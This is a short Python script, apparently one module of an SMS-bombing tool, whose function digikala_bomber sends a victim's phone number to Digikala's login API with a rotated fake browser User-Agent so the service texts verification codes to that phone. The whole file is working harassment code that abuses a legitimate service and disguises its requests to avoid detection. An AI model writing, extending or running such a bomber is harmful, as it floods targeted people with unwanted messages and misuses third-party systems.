import random
import requests


def digikala_bomber(number):
    try:
        digikala_api = 'https://api.digikala.com/v1/user/authenticate/'
        request_api = {"backUrl": "/", "username": number}
        heads = [
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
                'Accept': '*/*'
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
                'Accept': '*/*'
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
                'Accept': '*/*'
            },
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
                'Accept': '*/*'
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
                'Accept': '*/*'
            },
        ]

        random_head = random.choice(heads)

        req = requests.post(digikala_api, json=request_api, headers=random_head)

        print('MESSAGE SENT')
    except:
        print("Error in divar")


